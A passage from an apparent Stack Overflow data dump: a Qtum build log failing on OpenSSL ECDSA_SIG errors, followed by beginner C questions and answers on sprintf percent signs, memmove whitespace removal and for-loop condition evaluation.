libbitcoinconsensus_la-utilstrencodings.lo\nmake[3]: Entering directory `/home/qtum_data/qtum/src/secp256k1'\ngcc -I. -g -O2 -Wall -Wextra -Wno-unused-function -c src/gen_context.c -o gen_context.o\ngcc gen_context.o -o gen_context\n./gen_context\n  CC       src/libsecp256k1_la-secp256k1.lo\n  CCLD     libsecp256k1.la\nmake[3]: Leaving directory `/home/qtum_data/qtum/src/secp256k1'\n  CXXLD    libbitcoinconsensus.la\ncopying selected object files to avoid basename conflicts...\n  CXX      qtumd-bitcoind.o\n  CXX      libbitcoin_server_a-addrman.o\n  CXX      libbitcoin_server_a-addrdb.o\n  CXX      libbitcoin_server_a-bloom.o\n  CXX      libbitcoin_server_a-blockencodings.o\n  CXX      libbitcoin_server_a-chain.o\n  CXX      libbitcoin_server_a-checkpoints.o\n  CXX      libbitcoin_server_a-httprpc.o\n  CXX      libbitcoin_server_a-httpserver.o\n  CXX      libbitcoin_server_a-init.o\n  CXX      libbitcoin_server_a-dbwrapper.o\n  CXX      libbitcoin_server_a-merkleblock.o\n  CXX      libbitcoin_server_a-miner.o\n  CXX      libbitcoin_server_a-net.o\n  CXX      libbitcoin_server_a-net_processing.o\n  CXX      libbitcoin_server_a-noui.o\n  CXX      policy/libbitcoin_server_a-fees.o\n  CXX      policy/libbitcoin_server_a-policy.o\n  CXX      libbitcoin_server_a-pow.o\n  CXX      libbitcoin_server_a-pos.o\n  CXX      libbitcoin_server_a-rest.o\n  CXX      rpc/libbitcoin_server_a-blockchain.o\n  CXX      rpc/libbitcoin_server_a-mining.o\n  CXX      rpc/libbitcoin_server_a-misc.o\n  CXX      rpc/libbitcoin_server_a-net.o\n  CXX      rpc/libbitcoin_server_a-rawtransaction.o\n  CXX      rpc/libbitcoin_server_a-server.o\n  CXX      script/libbitcoin_server_a-sigcache.o\n  CXX      script/libbitcoin_server_a-ismine.o\n  CXX      libbitcoin_server_a-timedata.o\n  CXX      libbitcoin_server_a-torcontrol.o\n  CXX      libbitcoin_server_a-txdb.o\n  CXX      libbitcoin_server_a-txmempool.o\n  CXX      libbitcoin_server_a-ui_interface.o\n  CXX      libbitcoin_server_a-validation.o\n  CXX      libbitcoin_server_a-validationinterface.o\n  CXX      libbitcoin_server_a-versionbits.o\n  CXX      qtum/libbitcoin_server_a-qtumstate.o\n  CXX      qtum/libbitcoin_server_a-qtumtransaction.o\n  CXX      qtum/libbitcoin_server_a-qtumDGP.o\n  CXX      consensus/libbitcoin_server_a-consensus.o\n  CXX      qtum/libbitcoin_server_a-storageresults.o\n  AR       libbitcoin_server.a\n  CXX      libbitcoin_common_a-amount.o\n  CXX      libbitcoin_common_a-base58.o\n  CXX      libbitcoin_common_a-chainparams.o\n  CXX      libbitcoin_common_a-coins.o\n  CXX      libbitcoin_common_a-compressor.o\n  CXX      libbitcoin_common_a-core_read.o\n  CXX      libbitcoin_common_a-core_write.o\n  CXX      libbitcoin_common_a-key.o\nkey.cpp: In function \u2018bool EnsureLowS(std::vector&lt;unsigned char&gt;&amp;)\u2019:\nkey.cpp:149:19: error: invalid use of incomplete type \u2018ECDSA_SIG {aka struct ECDSA_SIG_st}\u2019\n     if (BN_cmp(sig-&gt;s, halforder) &gt; 0) {\n                   ^\nIn file included from /usr/include/openssl/ecdsa.h:10:0,\n                 from key.cpp:17:\n/usr/include/openssl/ec.h:1039:16: error: forward declaration of \u2018ECDSA_SIG {aka struct ECDSA_SIG_st}\u2019\n typedef struct ECDSA_SIG_st ECDSA_SIG;\n                ^\nkey.cpp:151:19: error: invalid use of incomplete type \u2018ECDSA_SIG {aka struct ECDSA_SIG_st}\u2019\n         BN_sub(sig-&gt;s, order, sig-&gt;s);\n                   ^\nIn file included from /usr/include/openssl/ecdsa.h:10:0,\n                 from key.cpp:17:\n/usr/include/openssl/ec.h:1039:16: error: forward declaration of \u2018ECDSA_SIG {aka struct ECDSA_SIG_st}\u2019\n typedef struct ECDSA_SIG_st ECDSA_SIG;\n                ^\nkey.cpp:151:34: error: invalid use of incomplete type \u2018ECDSA_SIG {aka struct ECDSA_SIG_st}\u2019\n         BN_sub(sig-&gt;s, order, sig-&gt;s);\n                                  ^\nIn file included from /usr/include/openssl/ecdsa.h:10:0,\n                 from key.cpp:17:\n/usr/include/openssl/ec.h:1039:16: error: forward declaration of \u2018ECDSA_SIG {aka struct ECDSA_SIG_st}\u2019\n typedef struct ECDSA_SIG_st ECDSA_SIG;\n                ^\nmake[2]: *** [libbitcoin_common_a-key.o] Error 1\nmake[2]: Leaving directory `/home/qtum_data/qtum/src'\nmake[1]: *** [all-recursive] Error 1\nmake[1]: Leaving directory `/home/qtum_data/qtum/src'\nmake: *** [all-recursive] Error 1\n</code></pre></li>\n<li><p>my server Environment</p>\n\n<p>OS - Linux xxxxxxx-X10SLL-F 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux\nopenssl version - OpenSSL 1.0.2g </p></li>\n<li><p>How can I solve this problem?</p></li>\n</ol>\n"}, {"tags": ["c", "mplab"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1517991079, "post_id": 48658764, "comment_id": 84315076, "body": "This should have been covered in just about any beginners book."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1517991114, "post_id": 48658764, "comment_id": 84315095, "body": "@Someprogrammerdude: I&#39;d wager that in a room containing 100 reasonably proficient C programmers, only 50 would know this."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "reply_to_user": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 1, "creation_date": 1517991175, "post_id": 48658764, "comment_id": 84315131, "body": "@Bathsheba -- that can&#39;t possibly be true; or if it is, I am scared for our future."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1517991200, "post_id": 48658764, "comment_id": 84315147, "body": "@DavidBowling: I fear it is: and they will be funding our pensions!"}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "reply_to_user": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 3, "creation_date": 1517991231, "post_id": 48658764, "comment_id": 84315167, "body": "@Bathsheba - Even if it is true, I consider part of true proficiency to be the ability to look it up."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "reply_to_user": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1517991285, "post_id": 48658764, "comment_id": 84315206, "body": "@StoryTeller: You have a point, I used to refer to my library of C and C++ books (and a dusty FORTRAN one too) prior to t&#39;internet."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1517998387, "post_id": 48658764, "comment_id": 84319544, "body": "I would not even have bothered to look it up and just used a &#39;%c&#39; to add the extra char."}], "answers": [{"tags": [], "owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "is_accepted": false, "score": 0, "last_activity_date": 1517991010, "creation_date": 1517991010, "answer_id": 48658796, "question_id": 48658764, "link": "https://stackoverflow.com/questions/48658764/how-can-i-place-symbol-after-an-interger/48658796#48658796", "title": "How can i place % symbol after an interger", "body": "<pre><code>sprintf(txt, \"%d%%\",CurrentArrayValue);\n</code></pre>\n\n<p>This will do the trick.</p>\n\n<p>From <a href=\"http://port70.net/~nsz/c/c11/n1570.html#7.21.6.1\" rel=\"nofollow noreferrer\">standard</a> \u00a77.21.6.1 C11 standard N1570</p>\n\n<pre><code>%\n</code></pre>\n\n<blockquote>\n  <p>A <code>%</code> character is written. No argument is converted. The complete conversion specification shall be <code>%%</code>. </p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": true, "score": 0, "last_activity_date": 1517991324, "last_edit_date": 1517991324, "creation_date": 1517991017, "answer_id": 48658798, "question_id": 48658764, "link": "https://stackoverflow.com/questions/48658764/how-can-i-place-symbol-after-an-interger/48658798#48658798", "title": "How can i place % symbol after an interger", "body": "<p>Use, simply a <code>%%</code> in the format string:</p>\n\n<pre><code>sprintf(txt, \"%d%%\",CurrentArrayValue * 100);\n</code></pre>\n\n<p>Your <code>'%'</code> is ignored by <code>sprintf</code> since your formatting string indicates to the function that only one additional argument is needed.</p>\n\n<p>You have to multiply <code>CurrentArrayValue</code> by 100 yourself by the way: I slipped that in to the function parameter list.</p>\n"}], "owner": {"reputation": 5, "user_id": 9326220, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e4c1635b166c7ec4a4df976c58f5a299?s=128&d=identicon&r=PG&f=1", "display_name": "MSD", "link": "https://stackoverflow.com/users/9326220/msd"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "closed_date": 1517991153, "accepted_answer_id": 48658798, "answer_count": 2, "score": -5, "last_activity_date": 1518024839, "creation_date": 1517990888, "last_edit_date": 1518024839, "question_id": 48658764, "link": "https://stackoverflow.com/questions/48658764/how-can-i-place-symbol-after-an-interger", "closed_reason": "Duplicate", "title": "How can i place % symbol after an interger", "body": "<p>I need to print a string with an integer an the symbol % after it.</p>\n\n<p>Here is what i try:</p>\n\n<pre><code>sprintf(txt, \"%d\",CurrentArrayValue,'%');\n</code></pre>\n\n<p>But my result is only my number. None symbol after that</p>\n"}, {"tags": ["c", "string", "visual-studio"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 4, "creation_date": 1517988080, "post_id": 48658012, "comment_id": 84313668, "body": "This seems like a good time to <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">learn how to debug your programs</a>. Using a debugger you can step through your code, while monitoring variables and their values, to see what&#39;s <i>really</i> is happening."}, {"owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "edited": false, "score": 0, "creation_date": 1517988336, "post_id": 48658012, "comment_id": 84313772, "body": "Please fix the closing bracket &#39;}&#39; for the while loops so that your code is a bit more readable."}, {"owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "edited": false, "score": 0, "creation_date": 1517988519, "post_id": 48658012, "comment_id": 84313858, "body": "And I am confused, your intro seems to indicate that you want to collapse multiple spaces between words to only a single space, yet the starting string in your program (lol) has only a single space between words.  Please elaborate on what you are trying to do."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "reply_to_user": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "edited": false, "score": 0, "creation_date": 1517988713, "post_id": 48658012, "comment_id": 84313945, "body": "@StephenDocy After removing instances of &quot;hello&quot; and &quot;asd&quot;, there may be instances of multiple spaces that need to be collapsed to a single space."}, {"owner": {"reputation": 87, "user_id": 9317849, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/f80ccaee2c800b74e07c206aada91cd6?s=128&d=identicon&r=PG&f=1", "display_name": "michael", "link": "https://stackoverflow.com/users/9317849/michael"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1517988806, "post_id": 48658012, "comment_id": 84313989, "body": "Yea that is the case what @user3386109 stated"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1517988900, "post_id": 48658012, "comment_id": 84314039, "body": "@michael The problem is that you&#39;re using the same code to remove spaces as you are to remove the other strings. So you end up removing both spaces. The <code>memmove</code> needs to be changed to only remove 1 space, not both."}, {"owner": {"reputation": 87, "user_id": 9317849, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/f80ccaee2c800b74e07c206aada91cd6?s=128&d=identicon&r=PG&f=1", "display_name": "michael", "link": "https://stackoverflow.com/users/9317849/michael"}, "edited": false, "score": 0, "creation_date": 1517989046, "post_id": 48658012, "comment_id": 84314120, "body": "Yea but How do I do that like with this loop I will find the spots where there is doublespace the string d, but the question is how do I configure the memmove to change them to only 1 space and not removing them.. I have tried million ways but can&#39;t get it working"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1517989496, "post_id": 48658012, "comment_id": 84314353, "body": "<code>memmove(dest, dest+1, strlen(dest));</code> will delete the one character that <code>dest</code> points to. You don&#39;t need any adjustment to the <code>strlen</code> because the output string is one character shorter than the input string."}, {"owner": {"reputation": 87, "user_id": 9317849, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/f80ccaee2c800b74e07c206aada91cd6?s=128&d=identicon&r=PG&f=1", "display_name": "michael", "link": "https://stackoverflow.com/users/9317849/michael"}, "edited": false, "score": 0, "creation_date": 1517989866, "post_id": 48658012, "comment_id": 84314529, "body": "yea that definitely works but is there a smart way to delete a whitepace from the start of the string if there is one, because now if the input string starts with &quot;asd&quot; it will leave one whitespace in the start of the string?"}, {"owner": {"reputation": 87, "user_id": 9317849, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/f80ccaee2c800b74e07c206aada91cd6?s=128&d=identicon&r=PG&f=1", "display_name": "michael", "link": "https://stackoverflow.com/users/9317849/michael"}, "edited": false, "score": 1, "creation_date": 1517990304, "post_id": 48658012, "comment_id": 84314733, "body": "I took the whitespace of from the start already!"}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1517991238, "post_id": 48658012, "comment_id": 84315180, "body": "<a href=\"https://meta.stackexchange.com/help/formatting\">Please read the formatting help, kiitos.</a> Use backticks to delimit verbatim code text."}], "answers": [{"comments": [{"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1517989747, "post_id": 48658303, "comment_id": 84314472, "body": "You need to adjust the length parameter as well."}, {"owner": {"reputation": 87, "user_id": 9317849, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/f80ccaee2c800b74e07c206aada91cd6?s=128&d=identicon&r=PG&f=1", "display_name": "michael", "link": "https://stackoverflow.com/users/9317849/michael"}, "edited": false, "score": 0, "creation_date": 1517989955, "post_id": 48658303, "comment_id": 84314562, "body": "yea this works too there&#39;s just one problem when the input string starts with &quot;hello&quot; or &quot;asd&quot; it will leave one whitespace in the start of the string and that shouldn&#39;t be there"}, {"owner": {"reputation": 87, "user_id": 9317849, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/f80ccaee2c800b74e07c206aada91cd6?s=128&d=identicon&r=PG&f=1", "display_name": "michael", "link": "https://stackoverflow.com/users/9317849/michael"}, "edited": false, "score": 0, "creation_date": 1517990706, "post_id": 48658303, "comment_id": 84314907, "body": "yea I did indeed!"}], "tags": [], "owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "is_accepted": false, "score": 0, "last_activity_date": 1517989042, "creation_date": 1517989042, "answer_id": 48658303, "question_id": 48658012, "link": "https://stackoverflow.com/questions/48658012/removing-a-few-whitespaces-from-string-with-c/48658303#48658303", "title": "removing a few whitespaces from string with c", "body": "<p>Ok, so you almost have it I think, change</p>\n\n<pre><code>memmove(dest, dest + strlen(c), 1 + strlen(dest + strlen(c)));\n</code></pre>\n\n<p>to</p>\n\n<pre><code>memmove(dest, dest + strlen(c) - 1, 1 + strlen(dest + strlen(c)));\n</code></pre>\n\n<p>I think that will do it.  The code was previously skipping two spaces, so if you back it up one spot, it should include one space in the copy.</p>\n\n<p>That should work for collapsing two spaces down to one space anyway.  You should test what happens if you end up with three spaces in a row.</p>\n"}], "owner": {"reputation": 87, "user_id": 9317849, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/f80ccaee2c800b74e07c206aada91cd6?s=128&d=identicon&r=PG&f=1", "display_name": "michael", "link": "https://stackoverflow.com/users/9317849/michael"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 67, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1517991226, "creation_date": 1517987876, "last_edit_date": 1517991226, "question_id": 48658012, "link": "https://stackoverflow.com/questions/48658012/removing-a-few-whitespaces-from-string-with-c", "title": "removing a few whitespaces from string with c", "body": "<p>First my code printed <code>yksi  itsekseen  lol</code> and now it prints <code>yksiitsekseenlol</code> and I am trying to print <code>yksi itsekseen lol</code>. In the first one there are two and second there's none and I'm trying to have there only one space between the words.</p>\n\n<p>My code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid antikorso(char *dest, const char *src) {\n    const char *p = src;\n    int i;\n\n    for (i = 0; *p != '\\0'; i++, p++)\n    {\n        if (*p == 'x') {\n            dest[i++] = 'k';\n            dest[i] = 's';\n        }\n        else if (*p == 'z') {\n            dest[i++] = 't';\n            dest[i] = 's';\n        }\n        else\n        {\n            dest[i] = *p;\n        }\n    }\n    dest[i] = '\\0';\n    char *original = dest;\n    char c[10] = \"hello\";\n    while (dest = strstr(dest, c)) {\n        memmove(dest, dest + strlen(c), 1 + strlen(dest + strlen(c)));\n    }\n\n    char *nat = original;\n    char b[20] = \"asd\";\n    while (dest = strstr(original, b)) {\n        memmove(dest, dest + strlen(b), 1 + strlen(dest + strlen(b)));\n    }\n    printf(\"\\n%s\", nat);\n\n    char *vit = nat;\n    char d[10] = \"  \";\n    while (dest = strstr(nat, d)) {\n        memmove(dest, dest + strlen(d), 1 + strlen(dest + strlen(d)));\n    }\n    printf(\"\\n%s\", vit);\n    return vit;\n    }\n\n\n\nint main(void)\n    {\n\n    const char *lol = \"hello yxi asd izexeen hello lol\";\n    char asd[10000];\n    antikorso(asd, lol);\n\n    }\n</code></pre>\n"}, {"tags": ["c", "loops", "gcc"], "comments": [{"owner": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 4, "creation_date": 1517986335, "post_id": 48657619, "comment_id": 84312825, "body": "You realise <code>func()</code> is called each time through the loop? If it is a constant value then just using a var is much more efficient..."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1517986442, "post_id": 48657619, "comment_id": 84312870, "body": "On an unrelated note, always remember to declare function prototypes <i>before</i> you call the functions. If there is no declaration of a function, the compiler will have to guess, and it&#39;s not always it can guess correctly."}, {"owner": {"user_type": "does_not_exist", "display_name": "user4484934"}, "edited": false, "score": 0, "creation_date": 1517986568, "post_id": 48657619, "comment_id": 84312936, "body": "I do, I just left it out here as it wasn&#39;t really important.  I&#39;ll add it in now though."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 4, "creation_date": 1517986776, "post_id": 48657619, "comment_id": 84313036, "body": "It is unclear what exactly you think is wrong with this output. The function is called at each loop iteration, and the output is printed at each iteration. At some iterations the loop body also prints something. Are you expecting for all the checks to happen before all the executions of the loop body, or after, or something other?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user4484934"}, "edited": false, "score": 0, "creation_date": 1517987133, "post_id": 48657619, "comment_id": 84313198, "body": "Ohh... This makes more sense, I thought checkX() would be evaluated once and the loop would run.  I didnt know checkX() would be called for each run of the loop.  Thanks to everyone for clearing this up for me."}], "answers": [{"tags": [], "owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "is_accepted": false, "score": 0, "last_activity_date": 1517988042, "creation_date": 1517988042, "answer_id": 48658046, "question_id": 48657619, "link": "https://stackoverflow.com/questions/48657619/c-for-loop-comparison-using-function-doesnt-wait/48658046#48658046", "title": "C For Loop Comparison Using Function Doesn&#39;t Wait", "body": "<pre><code>for (size_t i = 0; i &lt; func(val); i++) {\n    printf(\"Value from array modified in func = %u\", values[i]);\n}\n</code></pre>\n\n<p>func(val) gets called multiple times here, each time a decision needs to be made whether to continue the loop or not, you can picture it as</p>\n\n<pre><code>size_t i = 0;\nif (i &lt; func(val)) {\n    printf(.....);\n    i++;\n    if (i &lt; func(val)) {\n        printf(.....);\n        i++;\n        if (i &lt; func(val)) {\n            printf(.....);\n            i++;\n            if (i &lt; func(val)) {\n                printf(.....);\n                i++;\n                ....and so on......\n            }\n        }\n    }\n}\n</code></pre>\n\n<p>So you can see, func(val) may get called multiple times.</p>\n"}, {"tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 0, "last_activity_date": 1517990780, "last_edit_date": 1517990780, "creation_date": 1517990475, "answer_id": 48658653, "question_id": 48657619, "link": "https://stackoverflow.com/questions/48657619/c-for-loop-comparison-using-function-doesnt-wait/48658653#48658653", "title": "C For Loop Comparison Using Function Doesn&#39;t Wait", "body": "<p>A rather good, but a little out of date, section of the great book \"The C Programming Language\", by Kernighan and Ritchie, re-state a <code>for</code> loop to the equivalent:</p>\n\n<pre><code>{\n    size_t i = 0;\n    while (i &lt; func(val)){\n        printf(\"Value from array modified in func = %u\", values[i]);\n        i++;\n    }\n}\n</code></pre>\n\n<p>(The outer braces are mine and are necessary since you can now declare a variable inside the first \"expression\" in the <code>for</code> loop.)</p>\n\n<p>If you write the loop this way, it's plain to see that <code>func(val)</code> is re-evaluated on each iteration. That is what is causing the effects you observe. (Note that not all languages do this, VBA and VB6 are two examples where the end condition of the <code>for</code> loop is not re-evaluated.)</p>\n\n<p>Because of this, if <code>func(val)</code> is an expensive function and your algorithm doesn't require repeated evaluation, you might want to consider pre-computing the value in advance. Some compilers may optimise out the re-evaluation especially if you are using a standard function like <code>strlen</code> for example, but such an optimisation is a very tricky science.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user4484934"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 106, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1517990780, "creation_date": 1517986173, "last_edit_date": 1517986672, "question_id": 48657619, "link": "https://stackoverflow.com/questions/48657619/c-for-loop-comparison-using-function-doesnt-wait", "title": "C For Loop Comparison Using Function Doesn&#39;t Wait", "body": "<p>This is kind of strange, imo, I have a for loop that does a comparison\nusing the return value from a function.  </p>\n\n<pre><code>for (size_t i = 0; i &lt; func(val); i++) {\n    printf(\"Value from array modified in func = %u\", values[i]);\n}\n</code></pre>\n\n<p>The issue is the loop seems to run before the function is finished, if have a printf in the called function some output occurs before the output of the loop, expected, and some after, not expected.  The function is only called in the for loop comparison so output should all happen before for loop's output.  If I use a var instead such as:</p>\n\n<pre><code>size_t temp = func(val);\n\nfor (size_t i = 0; i &lt; temp; i++) {\n    printf(\"Value from array modified in func = %u\", values[i]);\n}\n</code></pre>\n\n<p>Then everything works correctly, this is rather odd to me, I'm not using threads so this should all be synchronus right?  So why would the loop not wait for func(val) to return?</p>\n\n<p>Here's the original code (cutting out a bunch of comments):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define SUITS 4\n#define FACES 13\n#define CARDS 52\n#define HAND 5\n\ntypedef struct {\n    unsigned int suit;\n    unsigned int face;\n} card;\n\nsize_t checkX(card hand[HAND], unsigned int faces[HAND], unsigned int num);\n\nint main() {\n\n    card hand[HAND] = {{1,1},{1,7},{1,1},{1,4},{1,7}};\n\n    const char *suit[SUITS] = {\"Hearts\", \"Diamonds\", \"Clubs\", \"Spades\"};\n    const char *face[FACES] = {\"Ace\", \"Deuce\", \"Three\", \"Four\", \"Five\", \"Six\", \"Seven\", \"Eight\", \"Nine\", \"Ten\", \"Jack\", \"Queen\", \"King\"};\n\n    unsigned int matchingFaces[HAND] = {0};\n\n    for (size_t i = 0; i &lt; checkX(hand, matchingFaces, 2); ++i) {\n        printf(\"Pair of %s%s\\n\", face[matchingFaces[i]], matchingFaces[i] == 5 ? \"es\" : \"s\");\n    }\n\n}\n\nsize_t checkX(card hand[HAND], unsigned int faces[HAND], unsigned int num) {\n\n    size_t facePos = 0; \n\n    for (size_t i = 0; i &lt; HAND - 1; i++) {\n\n        size_t count = 1;\n\n        for (size_t j = i + 1; j &lt; HAND; j++) {\n            